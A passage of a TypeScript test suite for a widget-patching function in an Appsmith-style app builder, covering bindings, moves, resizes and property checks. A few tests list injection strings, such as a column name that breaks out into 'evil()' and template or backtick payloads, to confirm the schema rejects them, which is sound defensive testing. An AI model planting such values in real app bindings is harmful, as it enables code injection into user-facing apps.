    const { dsl } = applyWidgetPatch(withInput, {
      operations: [
        {
          kind: "update",
          name: "EmailInput",
          props: { defaultValue: { table: "Users", column: "email" } },
        },
      ],
    });
    const input = dsl.children![3];

    expect(input.defaultText).toBe('{{ Users.selectedRow["email"] }}');
    // Re-binding does not duplicate the registered dynamic path.
    expect(input.dynamicBindingPathList).toEqual([{ key: "defaultText" }]);
  });

  it("rejects binding patches on the wrong widget type, unknown tables, and non-tables", () => {
    const withTable = page();

    withTable.children!.push(
      node({ widgetId: "t1", widgetName: "Users", type: "TABLE_WIDGET_V2" }),
    );

    // source only applies to text widgets.
    expect(() =>
      applyWidgetPatch(withTable, {
        operations: [
          {
            kind: "update",
            name: "Details",
            props: { source: { table: "Users", column: "email" } },
          },
        ],
      }),
    ).toThrow(/can only be set on a TEXT_WIDGET/);

    // The referenced table must exist...
    expect(() =>
      applyWidgetPatch(withTable, {
        operations: [
          {
            kind: "update",
            name: "Greeting",
            props: { source: { table: "Nope", column: "email" } },
          },
        ],
      }),
    ).toThrow(/table "Nope" was not found/);

    // ...and actually be a table.
    expect(() =>
      applyWidgetPatch(withTable, {
        operations: [
          {
            kind: "update",
            name: "Greeting",
            props: { source: { table: "Details", column: "email" } },
          },
        ],
      }),
    ).toThrow(/not a table widget/);
  });

  it("rejects a literal and a binding for the same property in one update", () => {
    const withTable = page();

    withTable.children!.push(
      node({ widgetId: "t1", widgetName: "Users", type: "TABLE_WIDGET_V2" }),
    );

    expect(() =>
      applyWidgetPatch(withTable, {
        operations: [
          {
            kind: "update",
            name: "Greeting",
            props: {
              text: "static",
              source: { table: "Users", column: "email" },
            },
          },
        ],
      }),
    ).toThrow(/cannot set both 'text' and 'source'/);
  });

  it("rejects a literal defaultText and a defaultValue binding in one update", () => {
    const withInput = page();

    withInput.children!.push(
      node({ widgetId: "t1", widgetName: "Users", type: "TABLE_WIDGET_V2" }),
      node({
        widgetId: "in1",
        widgetName: "EmailInput",
        type: "INPUT_WIDGET_V2",
      }),
    );

    expect(() =>
      applyWidgetPatch(withInput, {
        operations: [
          {
            kind: "update",
            name: "EmailInput",
            props: {
              defaultText: "static",
              defaultValue: { table: "Users", column: "email" },
            },
          },
        ],
      }),
    ).toThrow(/cannot set both 'defaultText' and 'defaultValue'/);
  });

  it("clears the stale dynamic path when a literal later replaces a binding", () => {
    const withTable = page();

    withTable.children!.push(
      node({ widgetId: "t1", widgetName: "Users", type: "TABLE_WIDGET_V2" }),
    );

    // Bind first, then overwrite with a literal in a separate update.
    const bound = applyWidgetPatch(withTable, {
      operations: [
        {
          kind: "update",
          name: "Greeting",
          props: { source: { table: "Users", column: "email" } },
        },
      ],
    });
    const { dsl } = applyWidgetPatch(bound.dsl, {
      operations: [
        { kind: "update", name: "Greeting", props: { text: "Plain again" } },
      ],
    });
    const greeting = dsl.children![0];

    expect(greeting.text).toBe("Plain again");
    expect(greeting.dynamicBindingPathList).toEqual([]);
  });

  it("schema rejects injection through binding refs in patches", () => {
    const bad = [
      { source: { table: "Users", column: 'x"]; evil()//' } },
      { source: { table: "{{Users}}", column: "email" } },
      { defaultValue: { table: "Users", column: "a`b" } },
    ];

    for (const props of bad) {
      expect(
        widgetPatchSchema.safeParse({
          operations: [{ kind: "update", name: "Greeting", props }],
        }).success,
      ).toBe(false);
    }
  });

  it("moves a widget into a container's inner canvas and preserves its size", () => {
    const { changes, dsl } = applyWidgetPatch(page(), {
      operations: [
        {
          kind: "move",
          name: "Greeting",
          parent: "Details",
          position: { topRow: 8, leftColumn: 4 },
        },
      ],
    });
    const container = dsl.children![0];
    const innerCanvas = container.children![0];
    const greeting = innerCanvas.children![0];

    expect(dsl.children?.map((child) => child.widgetName)).toEqual(["Details"]);
    expect(greeting).toMatchObject({
      widgetName: "Greeting",
      parentId: "detailsCanvas",
      topRow: 8,
      bottomRow: 12,
      leftColumn: 4,
      rightColumn: 28,
    });
    // The move itself, plus the container-fit cascade: Details grows so the widget landing at rows 8..12 is not
    // clipped (M6 section D).
    expect(changes).toEqual([
      {
        kind: "move",
        widgetName: "Greeting",
        previousParentWidgetName: "MainContainer",
        parentWidgetName: "Details",
        previousPosition: { topRow: 0, leftColumn: 0 },
        position: { topRow: 8, leftColumn: 4 },
      },
      {
        kind: "resize",
        widgetName: "Details",
        previousSize: { rows: 4 },
        size: { rows: 12 },
      },
    ]);
  });

  it("removes a leaf widget by name", () => {
    const { changes, dsl } = applyWidgetPatch(page(), {
      operations: [{ kind: "remove", name: "Greeting" }],
    });

    expect(dsl.children?.map((child) => child.widgetName)).toEqual(["Details"]);
    expect(changes).toEqual([{ kind: "remove", widgetName: "Greeting" }]);
  });

  it("rejects deletion of the root or a widget with children", () => {
    expect(() =>
      applyWidgetPatch(page(), {
        operations: [{ kind: "remove", name: "MainContainer" }],
      }),
    ).toThrow("root canvas");
    expect(() =>
      applyWidgetPatch(page(), {
        operations: [{ kind: "remove", name: "Details" }],
      }),
    ).toThrow("has children");
  });

  it("accepts the caption/default literals of the checkbox/switch/radio/select family and MULTI_LINE_TEXT, type-checked", () => {
    // Checkbox / switch / radio keep their caption in `label`; `labelText` is the select / multiselect caption
    // (the property panes own the names). The audit corrected the earlier guard, which admitted labelText here.
    const checkbox = node({
      widgetId: "cb",
      widgetName: "Agree",
      type: "CHECKBOX_WIDGET",
    });
    const select = node({
      widgetId: "sel",
      widgetName: "Tone",
      type: "SELECT_WIDGET",
    });
    const toggle = node({
      widgetId: "sw",
      widgetName: "Enabled",
      type: "SWITCH_WIDGET",
    });
    const input = node({
      widgetId: "in",
      widgetName: "Message",
      type: "INPUT_WIDGET_V2",
      inputType: "TEXT",
    });
    const dsl = node({
      widgetId: "0",
      widgetName: "MainContainer",
      type: "CANVAS_WIDGET",
      children: [checkbox, select, input, toggle],
    });
    const { dsl: patched } = applyWidgetPatch(dsl, {
      operations: [
        {
          kind: "update",
          name: "Agree",
          props: { label: "I agree", defaultCheckedState: true },
        },
        {
          kind: "update",
          name: "Enabled",
          props: { label: "Enabled", defaultSwitchState: false },
        },
        {
          kind: "update",
          name: "Tone",
          props: { defaultOptionValue: "INFO", labelText: "Tone" },
        },
        {
          kind: "update",
          name: "Message",
          props: { inputType: "MULTI_LINE_TEXT" },
        },
      ],
    });
    const byName = (name: string) =>
      patched.children!.find((w) => w.widgetName === name)!;

    expect(byName("Agree").label).toBe("I agree");
    expect(byName("Agree").labelText).toBeUndefined();
    expect(byName("Agree").defaultCheckedState).toBe(true);
    expect(byName("Enabled").label).toBe("Enabled");
    expect(byName("Enabled").defaultSwitchState).toBe(false);
    expect(byName("Tone").defaultOptionValue).toBe("INFO");
    expect(byName("Tone").labelText).toBe("Tone");
    expect(byName("Message").inputType).toBe("MULTI_LINE_TEXT");

    // The same literals on the wrong widget family are rejected, never silently written as dead props.
    expect(() =>
      applyWidgetPatch(dsl, {
        operations: [
          {
            kind: "update",
            name: "Tone",
            props: { defaultCheckedState: true },
          },
        ],
      }),
    ).toThrow("'defaultCheckedState' can only be set on CHECKBOX_WIDGET");
    expect(() =>
      applyWidgetPatch(dsl, {
        operations: [
          {
            kind: "update",
            name: "Agree",
            props: { inputType: "MULTI_LINE_TEXT" },
          },
        ],
      }),
    ).toThrow("'inputType' can only be set on INPUT_WIDGET_V2");
    expect(() =>
      applyWidgetPatch(dsl, {
        operations: [
          { kind: "update", name: "Message", props: { labelText: "x" } },
        ],
      }),
    ).toThrow(/'labelText' can only be set on .*SELECT_WIDGET/);
    // labelText on a checkbox was a dead property before the audit; it is now refused with the owners named.
    expect(() =>
      applyWidgetPatch(dsl, {
        operations: [
          { kind: "update", name: "Agree", props: { labelText: "x" } },
        ],
      }),
    ).toThrow(/'labelText' can only be set on .*SELECT_WIDGET/);
    expect(() =>
      applyWidgetPatch(dsl, {
        operations: [{ kind: "update", name: "Tone", props: { label: "x" } }],
      }),
    ).toThrow("'label' can only be set on");

    // Still literal-only: a binding in labelText / defaultOptionValue is rejected by the schema.
    for (const props of [
      { labelText: "{{ Query.data }}" },
      { defaultOptionValue: "${x}" },
      { inputType: "{{ x }}" },
    ]) {
      expect(
        widgetPatchSchema.safeParse({
          operations: [{ kind: "update", name: "Agree", props }],
        }).success,
      ).toBe(false);
    }
  });

  it("binds a widget's default to another widget's property or a query field via defaultFrom", () => {
    const select = node({
      widgetId: "sel",
      widgetName: "Tone",
      type: "SELECT_WIDGET",
    });
    const source = node({
      widgetId: "tbl",
      widgetName: "Banners",
      type: "TABLE_WIDGET_V2",
    });
    const toggle = node({
      widgetId: "sw",
      widgetName: "Enabled",
      type: "SWITCH_WIDGET",
    });
    const picker = node({
      widgetId: "dt",
      widgetName: "StartsAt",
      type: "DATE_PICKER_WIDGET2",
    });
    const text = node({
      widgetId: "t",
      widgetName: "Title",
      type: "TEXT_WIDGET",
    });
    const dsl = node({
      widgetId: "0",
      widgetName: "MainContainer",
      type: "CANVAS_WIDGET",
      children: [select, source, toggle, picker, text],
    });
    const { dsl: patched } = applyWidgetPatch(dsl, {
      operations: [
        {
          kind: "update",
          name: "Tone",
          props: {
            defaultFrom: { widget: "Banners", property: "selectedRow.tone" },
          },
        },
        {
          kind: "update",
          name: "Enabled",
          props: { defaultFrom: { query: "GetSettings", field: "enabled" } },
        },
        {
          kind: "update",
          name: "StartsAt",
          props: {
            defaultFrom: {
              widget: "Banners",
              property: "selectedRow.startsAt",
            },
          },
        },
      ],
    });
    const byName = (name: string) =>
      patched.children!.find((w) => w.widgetName === name)!;

    expect(byName("Tone").defaultOptionValue).toBe(
      "{{ Banners.selectedRow.tone }}",
    );
    expect(byName("Tone").dynamicBindingPathList).toEqual([
      { key: "defaultOptionValue" },
    ]);
    expect(byName("Enabled").defaultSwitchState).toBe(
      '{{ GetSettings.data?.enabled ?? "" }}',
    );
    expect(byName("StartsAt").defaultDate).toBe(
      "{{ Banners.selectedRow.startsAt }}",
    );

    // Wrong family, dangling source, self-reference, and a racing literal are all refused.
    expect(() =>
      applyWidgetPatch(dsl, {
        operations: [
          {
            kind: "update",
            name: "Title",
            props: { defaultFrom: { widget: "Banners", property: "x" } },
          },
        ],
      }),
    ).toThrow("'defaultFrom' can only be set on");
    expect(() =>
      applyWidgetPatch(dsl, {
        operations: [
          {
            kind: "update",
            name: "Tone",
            props: { defaultFrom: { widget: "Nope", property: "x" } },
          },
        ],
      }),
    ).toThrow('widget "Nope" was not found');
    expect(() =>
      applyWidgetPatch(dsl, {
        operations: [
          {
            kind: "update",
            name: "Tone",
            props: { defaultFrom: { widget: "Tone", property: "x" } },
          },
        ],
      }),
    ).toThrow("cannot reference the widget itself");
    expect(() =>
      applyWidgetPatch(dsl, {
        operations: [
          {
            kind: "update",
            name: "Tone",
            props: {
              defaultFrom: { widget: "Banners", property: "x" },
              defaultOptionValue: "INFO",
            },
          },
        ],
      }),
    ).toThrow("cannot set both 'defaultOptionValue' and 'defaultFrom'");

    for (const defaultFrom of [
      { widget: "Banners", property: "a[0]" },
      { widget: "B", property: "{{x}}" },
      { widget: "B" },
    ]) {
      expect(
        widgetPatchSchema.safeParse({
          operations: [
            { kind: "update", name: "Tone", props: { defaultFrom } },
          ],
        }).success,
      ).toBe(false);
    }
  });

  it("rejects raw bindings, templates, and non-allowlisted properties", () => {
    for (const text of ["{{ Query.data }}", "${dangerous}", "`dangerous`"]) {
      expect(
        widgetPatchSchema.safeParse({
          operations: [{ kind: "update", name: "Greeting", props: { text } }],
        }).success,
      ).toBe(false);
    }

    expect(
      widgetPatchSchema.safeParse({
        operations: [
          {
            kind: "update",
            name: "Greeting",
            props: { dynamicBindingPathList: [] },
          },
        ],
      }).success,
    ).toBe(false);
  });

  it("rejects U+2028/U+2029 line/paragraph separators in safe text", () => {
    // JSON.stringify leaves these unescaped and they terminate a JS string literal on pre-ES2019 engines, so
    // safeText must reject them (defense-in-depth for the JS-evaluated select sourceData and every other sink).
    for (const sep of [
      String.fromCharCode(0x2028),
      String.fromCharCode(0x2029),
    ]) {
      expect(
        widgetPatchSchema.safeParse({
          operations: [
            { kind: "update", name: "Greeting", props: { text: `a${sep}b` } },
          ],
        }).success,
      ).toBe(false);
    }
  });

  it("rejects reparenting a widget under itself or its descendants", () => {
    expect(() =>
      applyWidgetPatch(page(), {
        operations: [{ kind: "move", name: "Details", parent: "Details" }],
      }),
    ).toThrow("cannot be parented to itself");
  });

  it("is strictly typed at runtime", () => {
    expect(() =>
      widgetPatchSchema.parse({
        operations: [{ kind: "move", name: "Greeting", unknown: true }],
      }),
    ).toThrow(z.ZodError);
  });
});

// M6 — collision-aware move (design section B).
describe("applyWidgetPatch — occupancy-aware move", () => {
  function twoStacked(): WidgetNode {
    const a = node({
      widgetId: "a",
      widgetName: "Upper",
      type: "TEXT_WIDGET",
      topRow: 0,
      bottomRow: 10,
    });
    const b = node({
      widgetId: "b",
      widgetName: "Lower",
      type: "TEXT_WIDGET",
      topRow: 12,
      bottomRow: 20,
    });

    return node({
      widgetId: "0",
      widgetName: "MainContainer",
      type: "CANVAS_WIDGET",
      bottomRow: 380,
      rightColumn: 640,
      children: [a, b],
    });
  }

  it("repairs a colliding move to the nearest free spot, recording requestedPosition and a note", () => {
    const { changes, dsl, notes } = applyWidgetPatch(twoStacked(), {
      operations: [
        { kind: "move", name: "Lower", position: { topRow: 2, leftColumn: 0 } },
      ],
    });
    const lower = dsl.children![1];

    // 2 collides with Upper (0..10) -> pushed to 11.
    expect(lower).toMatchObject({ topRow: 11, bottomRow: 19 });
    expect(changes[0]).toEqual({
      kind: "move",
      widgetName: "Lower",
      previousPosition: { topRow: 12, leftColumn: 0 },
      position: { topRow: 11, leftColumn: 0 },
      requestedPosition: { topRow: 2, leftColumn: 0 },
    });
    // The adjustment is ALSO surfaced as a top-level note (agents skim changes; they read notes).
    expect(notes.join(" ")).toContain('"Lower"');
    expect(notes.join(" ")).toContain(
      "placed at { topRow: 11, leftColumn: 0 }",
    );
  });

  it("keeps the mobile row mirrors in sync with the repaired desktop rows", () => {
    const { dsl } = applyWidgetPatch(twoStacked(), {
      operations: [
        { kind: "move", name: "Lower", position: { topRow: 2, leftColumn: 0 } },
      ],
    });
    const lower = dsl.children![1];

    expect(lower.mobileTopRow).toBe(11);
    expect(lower.mobileBottomRow).toBe(19);
    expect(lower.mobileLeftColumn).toBe(0);
    expect(lower.mobileRightColumn).toBe(24);
  });

  it("honors a free explicit position exactly (no repair, no requestedPosition)", () => {
    const { changes, dsl, notes } = applyWidgetPatch(twoStacked(), {
      operations: [
        {
          kind: "move",
          name: "Lower",
          position: { topRow: 30, leftColumn: 8 },
        },
      ],
    });

    expect(dsl.children![1]).toMatchObject({
      topRow: 30,
      bottomRow: 38,
      leftColumn: 8,
      rightColumn: 32,
    });
    expect(changes[0].requestedPosition).toBeUndefined();
    expect(notes).toEqual([]);
  });

  it("strict: true rejects a colliding move with the collider names AND the nearest free position", () => {
    expect(() =>
      applyWidgetPatch(twoStacked(), {
        operations: [
          {
            kind: "move",
            name: "Lower",
            position: { topRow: 2, leftColumn: 0 },
            strict: true,
          },
        ],
      }),
    ).toThrow(
      'moving "Lower" to { topRow: 2, leftColumn: 0 } would overlap "Upper"; nearest free position is { topRow: 11, leftColumn: 0 }',
    );
  });

  it("reparenting is occupancy-aware: the landing position avoids occupants and is always recorded", () => {
    const dsl = twoStacked();
    const inner = node({
      widgetId: "cardCanvas",
      widgetName: "CardCanvas",
      type: "CANVAS_WIDGET",
      topRow: 0,
      bottomRow: 30,
      rightColumn: 24,
      children: [
        node({
          widgetId: "occ",
          widgetName: "Occupant",
          type: "TEXT_WIDGET",
          topRow: 0,
          bottomRow: 6,
        }),
      ],
    });

    dsl.children!.push(
      node({
        widgetId: "card",
        widgetName: "Card",
        type: "CONTAINER_WIDGET",
        topRow: 22,
        bottomRow: 52,
        rightColumn: 24,
        children: [inner],
      }),
    );

    const { changes, dsl: edited } = applyWidgetPatch(dsl, {
      operations: [{ kind: "move", name: "Upper", parent: "Card" }],
    });
    const moved = edited
      .children!.find((c) => c.widgetName === "Card")!
      .children![0].children!.find((c) => c.widgetName === "Upper")!;

    // Old coordinates (0..10) collide with Occupant (0..6): server lands it at 7 and records the position.
    expect(moved).toMatchObject({ topRow: 7, bottomRow: 17, leftColumn: 0 });
    expect(changes[0]).toMatchObject({
      kind: "move",
      widgetName: "Upper",
      previousParentWidgetName: "MainContainer",
      parentWidgetName: "Card",
      previousPosition: { topRow: 0, leftColumn: 0 },
      position: { topRow: 7, leftColumn: 0 },
    });
  });

  it("moves a detached modal without occupancy checks or cascades", () => {
    const dsl = twoStacked();

    dsl.children!.push(
      node({
        widgetId: "m1",
        widgetName: "AddModal",
        type: "MODAL_WIDGET",
        topRow: 0,
        bottomRow: 24,
        rightColumn: 32,
        detachFromLayout: true,
      }),
    );

    const {
      changes,
      dsl: edited,
      notes,
    } = applyWidgetPatch(dsl, {
      operations: [
        {
          kind: "move",
          name: "AddModal",
          position: { topRow: 5, leftColumn: 0 },
        },
      ],
    });

    // The nominal rect moved; no repair against the in-flow widgets it "covers".
    expect(edited.children![2]).toMatchObject({ topRow: 5, bottomRow: 29 });
    expect(changes).toHaveLength(1);
    expect(notes).toEqual([]);
  });

  it("rejects moving a widget whose rect is non-numeric", () => {
    const dsl = twoStacked();

    dsl.children![0].topRow = Number.NaN;

    expect(() =>
      applyWidgetPatch(dsl, {
        operations: [
          {
            kind: "move",
            name: "Upper",
            position: { topRow: 30, leftColumn: 0 },
          },
        ],
      }),
    ).toThrow(/non-numeric position/);
  });
});

// M6 — the resize operation (design section B2).
describe("applyWidgetPatch — resize", () => {
  function pageWith(children: WidgetNode[]): WidgetNode {
    return node({
      widgetId: "0",
      widgetName: "MainContainer",
      type: "CANVAS_WIDGET",
      bottomRow: 380,
      rightColumn: 640,
      children,
    });
  }

  function card(bodyChildren: WidgetNode[], rows: number): WidgetNode {
    const inner = node({
      widgetId: "cardCanvas",
      widgetName: "CardCanvas",
      type: "CANVAS_WIDGET",
      topRow: 0,
      bottomRow: rows,
      rightColumn: 40,
      children: bodyChildren,
    });

    return node({
      widgetId: "card",
      widgetName: "Card",
      type: "CONTAINER_WIDGET",
      topRow: 0,
      bottomRow: rows,
      rightColumn: 40,
      children: [inner],
    });
  }

  it("grows a widget and cascade-pushes the colliding below-sibling, recording both", () => {
    const dsl = pageWith([
      node({
        widgetId: "a",
        widgetName: "Upper",
        type: "TEXT_WIDGET",
        topRow: 0,
        bottomRow: 10,
      }),
      node({
        widgetId: "b",
        widgetName: "Lower",
        type: "TEXT_WIDGET",
        topRow: 11,
        bottomRow: 18,
      }),
    ]);
    const {
      changes,
      dsl: edited,
      notes,
    } = applyWidgetPatch(dsl, {
      operations: [{ kind: "resize", name: "Upper", rows: 15 }],
    });
    const [upper, lower] = edited.children!;

    expect(upper).toMatchObject({ topRow: 0, bottomRow: 15 });
    // Lower was pushed just past the grown widget.
    expect(lower).toMatchObject({ topRow: 16, bottomRow: 23 });
    expect(lower.mobileTopRow).toBe(16);
    expect(changes[0]).toEqual({
      kind: "resize",
      widgetName: "Upper",
      previousSize: { rows: 10, columns: 24 },
      size: { rows: 15, columns: 24 },
    });
    expect(changes[1]).toMatchObject({ kind: "move", widgetName: "Lower" });
    expect(notes.join(" ")).toContain('"Lower"');
  });

  it("strict: true rejects growth that would land on a sibling", () => {
    const dsl = pageWith([
      node({
        widgetId: "a",
        widgetName: "Upper",
        type: "TEXT_WIDGET",
        topRow: 0,
        bottomRow: 10,
      }),
      node({
        widgetId: "b",
        widgetName: "Lower",
        type: "TEXT_WIDGET",
        topRow: 11,
        bottomRow: 18,
      }),
    ]);

    expect(() =>
      applyWidgetPatch(dsl, {
        operations: [{ kind: "resize", name: "Upper", rows: 15, strict: true }],
      }),
    ).toThrow(/would overlap "Lower"/);
  });

  it("rejects width growth past the canvas with the available columns", () => {
    const dsl = pageWith([
      node({
        widgetId: "a",
        widgetName: "Wide",
        type: "TEXT_WIDGET",
        leftColumn: 50,
        rightColumn: 64,
      }),
    ]);

    expect(() =>
      applyWidgetPatch(dsl, {
        operations: [{ kind: "resize", name: "Wide", columns: 20 }],
      }),
    ).toThrow(/14 columns are available from leftColumn 50/);
  });

  it("rejects shrinking a container below its children with the executable minimum", () => {
    const dsl = pageWith([
      card(
        [
          node({
            widgetId: "f",
            widgetName: "Field",
            type: "INPUT_WIDGET_V2",
            topRow: 0,
            bottomRow: 30,
          }),
        ],
        40,
      ),
    ]);

    expect(() =>
      applyWidgetPatch(dsl, {
        operations: [{ kind: "resize", name: "Card", rows: 10 }],
      }),
    ).toThrow(/smallest rows that fit the children: 30/);

    expect(() =>
      applyWidgetPatch(dsl, {
        operations: [{ kind: "resize", name: "Card", columns: 10 }],
      }),
    ).toThrow(/smallest columns that fit the children: 24/);
  });

  it("shrinks a container down to (but not past) its children, keeping the inner canvas in step", () => {
    const dsl = pageWith([
      card(
        [
          node({
            widgetId: "f",
            widgetName: "Field",
            type: "INPUT_WIDGET_V2",
            topRow: 0,
            bottomRow: 30,
          }),
        ],
        40,
      ),
    ]);
    const { dsl: edited } = applyWidgetPatch(dsl, {
      operations: [{ kind: "resize", name: "Card", rows: 30 }],
    });
    const container = edited.children![0];

    expect(container).toMatchObject({ topRow: 0, bottomRow: 30 });
    expect(container.children![0]).toMatchObject({ bottomRow: 30 });
    expect(container.mobileBottomRow).toBe(30);
  });

  it("translates modal rows into the pixel height prop (rows × rowHeightPx)", () => {
    const dsl = pageWith([
      node({
        widgetId: "m1",
        widgetName: "AddModal",
        type: "MODAL_WIDGET",
        topRow: 0,
        bottomRow: 24,
        rightColumn: 32,
        height: 252,
        detachFromLayout: true,
        children: [
          node({
            widgetId: "mc",
            widgetName: "ModalCanvas",
            type: "CANVAS_WIDGET",
            topRow: 0,
            bottomRow: 24,
            rightColumn: 32,
            children: [],
          }),
        ],
      }),
    ]);
    const {
      changes,
      dsl: edited,
      notes,
    } = applyWidgetPatch(dsl, {
      operations: [{ kind: "resize", name: "AddModal", rows: 40 }],
    });

    expect(edited.children![0].height).toBe(400);
    expect(changes[0]).toEqual({
      kind: "resize",
      widgetName: "AddModal",
      previousSize: { rows: 25 },
      size: { rows: 40 },
    });
    expect(notes.join(" ")).toContain("400px");
  });

  it("rejects modal column resizing (height-only vocabulary in v1)", () => {
    const dsl = pageWith([
      node({
        widgetId: "m1",
        widgetName: "AddModal",
        type: "MODAL_WIDGET",
        height: 252,
        detachFromLayout: true,
      }),
    ]);

    expect(() =>
      applyWidgetPatch(dsl, {
        operations: [{ kind: "resize", name: "AddModal", columns: 40 }],
      }),
    ).toThrow(/rows only/);
  });

  it("schema: resize requires rows or columns, integers >= 1, and is strictly typed", () => {
    expect(
      widgetPatchSchema.safeParse({
        operations: [{ kind: "resize", name: "Card" }],
      }).success,
    ).toBe(false);
    expect(
      widgetPatchSchema.safeParse({
        operations: [{ kind: "resize", name: "Card", rows: 0 }],
      }).success,
    ).toBe(false);
    expect(
      widgetPatchSchema.safeParse({
        operations: [{ kind: "resize", name: "Card", rows: 2.5 }],
      }).success,
    ).toBe(false);
    expect(
      widgetPatchSchema.safeParse({
        operations: [{ kind: "resize", name: "Card", rows: 12, unknown: 1 }],
      }).success,
    ).toBe(false);
    expect(
      widgetPatchSchema.safeParse({
        operations: [
          { kind: "resize", name: "Card", rows: 12, columns: 20, strict: true },
        ],
      }).success,
    ).toBe(true);
  });
});

describe("applyWidgetPatch — widget-property audit (APP-16052)", () => {
  function widgets(): WidgetNode {
    return node({
      widgetId: "0",
      widgetName: "MainContainer",
      type: "CANVAS_WIDGET",
      children: [
        node({
          widgetId: "t",
          widgetName: "Banners",
          type: "TABLE_WIDGET_V2",
          multiRowSelection: false,
          defaultSelectedRowIndex: 0,
          borderRadius: "{{appsmith.theme.borderRadius.appBorderRadius}}",
          boxShadow: "{{appsmith.theme.boxShadow.appBoxShadow}}",
          accentColor: "{{appsmith.theme.colors.primaryColor}}",
          dynamicBindingPathList: [
            { key: "borderRadius" },
            { key: "boxShadow" },
            { key: "accentColor" },
          ],
        }),
        node({
          widgetId: "m",
          widgetName: "Picks",
          type: "TABLE_WIDGET_V2",
          multiRowSelection: true,
        }),
        node({
          widgetId: "tx",
          widgetName: "Title",
          type: "TEXT_WIDGET",
          text: "Hi",
        }),
        node({
          widgetId: "in",
          widgetName: "Email",
          type: "INPUT_WIDGET_V2",
          inputType: "EMAIL",
        }),
        node({ widgetId: "b", widgetName: "Save", type: "BUTTON_WIDGET" }),
        node({
          widgetId: "ms",
          widgetName: "Tags",
          type: "MULTI_SELECT_WIDGET_V2",
        }),
        node({ widgetId: "s", widgetName: "Tone", type: "SELECT_WIDGET" }),
        node({
          widgetId: "d",
          widgetName: "StartsAt",
          type: "DATE_PICKER_WIDGET2",
        }),
        node({
          widgetId: "f",
          widgetName: "Upload",
          type: "FILE_PICKER_WIDGET_V2",
        }),
        node({ widgetId: "c", widgetName: "Sales", type: "CHART_WIDGET" }),
        node({ widgetId: "i", widgetName: "Photo", type: "IMAGE_WIDGET" }),
      ],
    });
  }

  const byName = (dsl: WidgetNode, name: string) =>
    dsl.children!.find((w) => w.widgetName === name)!;

  it("sets a table's default selected row in the mode the table is in, with -1 meaning no default", () => {
    const { changes, dsl } = applyWidgetPatch(widgets(), {
      operations: [
        {
          kind: "update",
          name: "Banners",
          props: { defaultSelectedRowIndex: 2 },
        },
        {
          kind: "update",
          name: "Picks",
          props: { defaultSelectedRowIndices: [0, 3] },
        },
      ],
    });

    expect(byName(dsl, "Banners").defaultSelectedRowIndex).toBe(2);
    expect(byName(dsl, "Picks").defaultSelectedRowIndices).toEqual([0, 3]);
    expect(changes.map((c) => c.changedProps)).toEqual([
      ["defaultSelectedRowIndex"],
      ["defaultSelectedRowIndices"],
    ]);

    const cleared = applyWidgetPatch(widgets(), {
      operations: [
        {
          kind: "update",
          name: "Banners",
          props: { defaultSelectedRowIndex: -1 },
        },
      ],
    }).dsl;

    expect(byName(cleared, "Banners").defaultSelectedRowIndex).toBe(-1);

    // Below the pane's own minimum, a fraction, or a non-table are refused.
    for (const props of [
      { defaultSelectedRowIndex: -2 },
      { defaultSelectedRowIndex: 1.5 },
      { defaultSelectedRowIndices: [-1] },
      { defaultSelectedRowIndex: "{{ x }}" },
    ]) {
      expect(
        widgetPatchSchema.safeParse({
          operations: [{ kind: "update", name: "Banners", props }],
        }).success,
      ).toBe(false);
    }

    expect(() =>
      applyWidgetPatch(widgets(), {
        operations: [
          {
            kind: "update",
            name: "Title",
            props: { defaultSelectedRowIndex: 0 },
          },
        ],
      }),
    ).toThrow("'defaultSelectedRowIndex' can only be set on TABLE_WIDGET_V2");
  });

  it("refuses the default-row prop of the other selection mode, unless the mode is switched in the same update", () => {
    expect(() =>
      applyWidgetPatch(widgets(), {
        operations: [
          {
            kind: "update",
            name: "Banners",
            props: { defaultSelectedRowIndices: [0] },
          },
        ],
      }),
    ).toThrow(
      "'defaultSelectedRowIndices' applies while multi-row selection is on",
    );
    expect(() =>
      applyWidgetPatch(widgets(), {
        operations: [
          {
            kind: "update",
            name: "Picks",
            props: { defaultSelectedRowIndex: 0 },
          },
        ],
      }),
    ).toThrow(
      "'defaultSelectedRowIndex' applies while multi-row selection is off",
    );

    const { dsl } = applyWidgetPatch(widgets(), {
      operations: [
        {
          kind: "update",
          name: "Banners",
          props: { multiRowSelection: true, defaultSelectedRowIndices: [1] },
        },
        {
          kind: "update",
          name: "Picks",
          props: { multiRowSelection: false, defaultSelectedRowIndex: 4 },
        },
      ],
    });

    expect(byName(dsl, "Banners")).toMatchObject({
      multiRowSelection: true,
      defaultSelectedRowIndices: [1],
    });
    expect(byName(dsl, "Picks")).toMatchObject({
      multiRowSelection: false,
      defaultSelectedRowIndex: 4,
    });
  });

  it("binds a table's default row to another widget or a query field via defaultFrom, by selection mode", () => {
    const { dsl } = applyWidgetPatch(widgets(), {
      operations: [
        {
          kind: "update",
          name: "Banners",
          props: { defaultFrom: { query: "GetRowIndex", field: "index" } },
        },
        {
          kind: "update",
          name: "Picks",
          props: {
            defaultFrom: { widget: "Banners", property: "selectedRowIndices" },
          },
        },
      ],
    });

    expect(byName(dsl, "Banners").defaultSelectedRowIndex).toBe(
      '{{ GetRowIndex.data?.index ?? "" }}',
    );
    expect(byName(dsl, "Banners").dynamicBindingPathList).toEqual(
      expect.arrayContaining([{ key: "defaultSelectedRowIndex" }]),
    );
    expect(byName(dsl, "Picks").defaultSelectedRowIndices).toBe(
      "{{ Banners.selectedRowIndices }}",
    );

    // A racing literal for the same prop is still ambiguous.
    expect(() =>
      applyWidgetPatch(widgets(), {
        operations: [
          {
            kind: "update",
            name: "Banners",
            props: {
              defaultFrom: { query: "Q" },
              defaultSelectedRowIndex: 1,
            },
          },
        ],
      }),
    ).toThrow("cannot set both 'defaultSelectedRowIndex' and 'defaultFrom'");
  });

  it("accepts theme presets by name for radius and shadow, stores the pane's value, and drops the theme binding", () => {
    const { dsl } = applyWidgetPatch(widgets(), {
      operations: [
        {
          kind: "update",
          name: "Banners",
          props: {
            borderRadius: "M",
            boxShadow: "L",
            accentColor: "#553de9",
            headerRowColor: "#f5f5f5",
            compactMode: "SHORT",
            textSize: "1rem",
            fontStyle: "BOLD,ITALIC",
            variant: "VARIANT2",
          },
        },
      ],
    });
    const table = byName(dsl, "Banners");

    expect(table).toMatchObject({
      borderRadius: "0.375rem",
      boxShadow:
        "0 10px 15px -3px rgba(0, 0, 0, 0.1), 0 4px 6px -2px rgba(0, 0, 0, 0.05)",
      accentColor: "#553de9",
      headerRowColor: "#f5f5f5",
      compactMode: "SHORT",
      textSize: "1rem",
      fontStyle: "BOLD,ITALIC",
      variant: "VARIANT2",
    });
    // The theme bindings those style props carried by default are unregistered, so the literal is what renders.
